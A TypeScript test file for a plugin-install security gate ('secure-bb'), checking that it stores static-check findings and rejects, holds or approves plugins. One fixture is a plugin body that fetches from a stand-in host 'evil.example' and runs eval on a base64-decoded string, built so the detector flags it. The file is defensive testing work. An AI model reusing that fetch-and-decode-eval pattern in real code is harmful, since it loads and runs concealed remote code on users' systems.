import { mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import Database from "better-sqlite3";
import { describe, expect, it } from "vitest";
import type { CheckResult } from "../src/checks/index.js";
import { Gate, type HookCtx } from "../src/gate.js";
import { buildOverview } from "../src/overview.js";
import { MIGRATIONS, Store } from "../src/store.js";
import { Watchdog } from "../src/watch/watchdog.js";
import { FakeBb } from "./support/watch.js";

const root = realpathSync(mkdtempSync(join(tmpdir(), "sbb-cg-")));
const ctx = (dir: string, hash: string): HookCtx => ({ pluginId: "demo", version: "1.0.0", source: `path:${dir}`, sourceKind: "path", gitCommit: null, npmIntegrity: null, rootDir: dir, contentHash: hash, trigger: "install" });

function setup(runChecks?: (dir: string) => Promise<CheckResult>) {
  const db = new Database(":memory:");
  for (const stmt of MIGRATIONS) db.exec(stmt);
  const store = new Store(db, () => 1_800_000_000_000);
  let checked = 0;
  const gate = new Gate({
    store,
    now: () => 1_800_000_000_000,
    threads: { ancestors: async () => [], descendants: async () => [] },
    thirdPartyRunning: async () => [],
    externalTotpFile: null,
    snapshotsRoot: join(root, "snapshots"),
    unsafeDirs: async () => [],
    runChecks,
    onChecked: () => checked++,
  });
  return { store, gate, checked: () => checked };
}
function plugin(name: string, body: string): string {
  const dir = join(root, name);
  mkdirSync(dir, { mode: 0o755 });
  writeFileSync(join(dir, "index.js"), body, { mode: 0o644 });
  return dir;
}

describe("check results are stored, linked to the hook's hash and shown", () => {
  it("a version with a hard sign is rejected, and its findings and capabilities are stored", async () => {
    const { store, gate, checked } = setup();
    const dir = plugin("p1", "const r = await fetch('https://evil.example/x');\neval(atob('MQ=='));\n");
    const d = await gate.decide(ctx(dir, "sha256:p1"));
    expect(d.action).toBe("reject"); // decode→eval is a hard sign (spec §5.3: block)
    await gate.checksIdle();
    const stored = store.getCheck("sha256:p1")!;
    expect(stored.result.findings.map((f) => f.rule)).toContain("decode-eval");
    expect(stored.result.capabilities.map((c) => c.kind)).toEqual(["network", "dynamic_code"]);
    expect(checked()).toBe(1);
    expect(store.listLog(5).some((l) => l.kind === "check")).toBe(true);
  });

  it("a clean plugin that is not one of our snapshots (external / direct install) is still held", async () => {
    const { gate, store } = setup();
    const d = await gate.decide(ctx(plugin("p2", "export default 1;\n"), "sha256:p2"));
    expect(d.action).toBe("wait");
    await gate.checksIdle();
    expect(store.getCheck("sha256:p2")!.result).toMatchObject({ findings: [], capabilities: [] });
  });

  it("an already approved version proceeds at once and is checked in the background once", async () => {
    let runs = 0;
    const { gate, store } = setup(async () => (runs++, { findings: [], capabilities: [], stats: { files: 0, parsed: 0, bytes: 0, ms: 0 } }));
    store.addApproval({ contentHash: "sha256:ok", pluginId: "demo", version: "1.0.0", source: "path:/x", sourceKind: "path", gitCommit: null, npmIntegrity: null, via: "touch", windowId: null, threadId: null });
    const dir = plugin("p3", "export default 1;\n");
    expect((await gate.decide(ctx(dir, "sha256:ok"))).action).toBe("proceed");
    expect((await gate.decide(ctx(dir, "sha256:ok"))).action).toBe("proceed");
    await gate.checksIdle();
    expect(runs).toBe(1);
  });

  it("a crashing check never changes or delays the hook answer", async () => {
    const { gate, store } = setup(async () => {
      throw new Error("boom");
    });
    const d = await gate.decide(ctx(plugin("p4", "export {};\n"), "sha256:p4"));
    expect(d).toEqual({ action: "wait", reason: expect.stringContaining("held by secure-bb: review #") });
    await gate.checksIdle();
    expect(store.getCheck("sha256:p4")).toBeNull();
    expect(store.listLog(5).some((l) => l.kind === "check.error")).toBe(true);
  });

  it("the overview carries the results for held entries", async () => {
    const { gate, store } = setup();
    await gate.decide(ctx(plugin("p5", "import net from 'node:net';\nexport default net;\n"), "sha256:p5"));
    await gate.checksIdle();
    const ov = await buildOverview({
      store,
      gate,
      now: () => 1_800_000_000_000,
      hookRegistered: true,
      listPlugins: async () => [],
      probe: async () => ({ hookRegistered: true, env: {}, serverUid: 1, agentUid: 2, accountState: "unknown", builtins: {}, connectHold: { exists: false, serverCanDelete: null }, bind: { address: null, loopbackOnly: null }, apiAuth: "unknown", thirdParty: [], telemetryConfigured: null }),
      descendants: async () => [],
      watch: new Watchdog({ store, now: () => 1_800_000_000_000, source: new FakeBb(), actions: new FakeBb().actions, touch: () => undefined }),
    });
    const hash = store.listQueue(5)[0]!.contentHash!;
    expect(ov.checks[hash]!.capabilities[0]!.kind).toBe("network");
  });
});
